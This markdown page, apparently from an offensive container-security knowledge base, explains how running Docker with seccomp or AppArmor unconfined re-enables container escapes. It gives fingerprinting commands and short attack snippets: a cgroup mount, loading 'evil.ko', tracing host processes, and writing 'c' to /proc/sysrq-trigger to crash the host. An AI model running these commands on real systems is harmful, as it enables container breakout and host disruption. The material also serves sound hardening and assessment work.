---
title: "Unconfined seccomp or AppArmor: escapes unlocked by a disabled syscall or LSM profile"
description: "A container run with seccomp=unconfined or without an AppArmor/SELinux profile loses the filters that normally block dangerous syscalls and file paths. This re-enables mount, ptrace, keyctl, unshare, and writes to proc and sysfs paths that a default profile denies, turning otherwise-blocked capability escapes into working ones."
keywords:
  - seccomp unconfined
  - apparmor unconfined
  - docker-default profile
  - syscall filter
  - container escape
---

# Unconfined seccomp or AppArmor

Seccomp and the Linux Security Modules (AppArmor or SELinux) are the second line after capabilities: even a capability you hold is useless if the syscall behind it is filtered, or the path it needs is denied. Docker ships a default seccomp profile that blocks around forty syscalls and a `docker-default` AppArmor profile that denies writes to sensitive `proc` and `sys` paths. Running with `--security-opt seccomp=unconfined` or `--security-opt apparmor=unconfined` removes these filters, re-opening escape routes that a default container cannot use.

Fingerprint the confinement:

```bash
grep Seccomp /proc/self/status          # 0 = no filter, 2 = a filter is active
grep Seccomp_filters /proc/self/status  # number of installed filters
cat /proc/self/attr/current 2>/dev/null # "docker-default (enforce)" or "unconfined"
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head
```

## What unconfined re-enables

The default seccomp profile blocks, among others, `mount`, `umount2`, `pivot_root`, `ptrace`, `keyctl`, `add_key`, `bpf`, `init_module`/`finit_module`, `kexec_load`, and the `clone`/`unshare` namespace flags for user namespaces. With `seccomp=unconfined`, a container that also holds the matching capability can now actually call them:

```bash
# with seccomp=unconfined + CAP_SYS_ADMIN, mount is callable again
mount -t cgroup -o rdma cgroup /tmp/cg 2>&1   # fails under default seccomp, works unconfined
# with seccomp=unconfined + CAP_SYS_MODULE, module loading is callable
insmod ./evil.ko
# ptrace-based host injection becomes possible with a shared PID namespace
strace -p <host_pid>
```

AppArmor `docker-default`, when enforced, additionally denies writes to paths such as `/proc/sysrq-trigger`, `/proc/sys/kernel/*`, and `/sys/firmware/*` even if DAC and capabilities would allow them. Running `apparmor=unconfined` lifts these path denials:

```bash
# denied under docker-default, allowed unconfined: trigger a host action via sysrq
echo c > /proc/sysrq-trigger           # (crash) example of a path the profile blocks
echo <hostpid> > /sys/fs/cgroup/.../cgroup.procs   # cgroup writes the profile may deny
```

## Exploitation notes

- Unconfined profiles rarely escape on their own; they are an amplifier. The escape still needs the capability or device. The combination that matters is, for example, `CAP_SYS_ADMIN` plus `seccomp=unconfined`, which re-enables the mount-based [cgroups release_agent](cgroups-release-agent.md) route.
- Always check both filters: a container can keep capabilities yet be neutered by seccomp, or hold an enforcing AppArmor profile that blocks the exact `proc`/`sys` write your technique needs. `Seccomp: 2` with a low filter count plus `docker-default (enforce)` is a hardened target.
- `--privileged` implicitly sets both to unconfined, which is why it unlocks every route; see [Privileged flag](privileged-flag.md).

## References

- [Docker: seccomp security profiles](https://docs.docker.com/engine/security/seccomp/)
- [Docker: AppArmor security profiles](https://docs.docker.com/engine/security/apparmor/)
- [moby default seccomp profile](https://github.com/moby/moby/blob/master/profiles/seccomp/default.json)
